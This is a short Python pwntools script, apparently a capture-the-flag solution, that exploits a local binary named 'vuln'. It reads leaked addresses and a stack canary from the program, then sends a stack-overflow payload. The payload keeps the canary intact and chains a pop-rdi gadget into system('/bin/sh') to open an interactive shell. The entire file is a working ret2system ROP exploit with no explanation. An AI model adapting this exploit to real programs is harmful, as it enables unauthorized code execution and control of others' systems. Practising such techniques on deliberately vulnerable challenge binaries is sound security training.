from pwn import *

chal = ELF('./vuln')

gdbscript='''
b main
c
'''

conn = process([chal.path])
#conn = gdb.debug([chal.path], gdbscript)

def main():
    conn.recvuntil(b' @ ')
    addr_system = int(conn.recvline().strip(), 0x10)
    conn.recvuntil(b' @ ')
    addr_pop_rdi_ret = int(conn.recvline().strip(), 0x10)
    conn.recvuntil(b' @ ')
    addr_ret = int(conn.recvline().strip(), 0x10)
    conn.recvuntil(b' @ ')
    addr_bin_sh = int(conn.recvline().strip(), 0x10)
    conn.recvuntil(b': ')
    canary = int(conn.recvline().strip(), 0x10)

    payload = b'\0' * 0x38 + p64(canary) + p64(0) + p64(addr_pop_rdi_ret) + p64(addr_bin_sh) + p64(addr_ret) + p64(addr_system)
    conn.sendlineafter(b': ', payload)
    conn.clean()
    conn.interactive()

if __name__ == '__main__':
    main()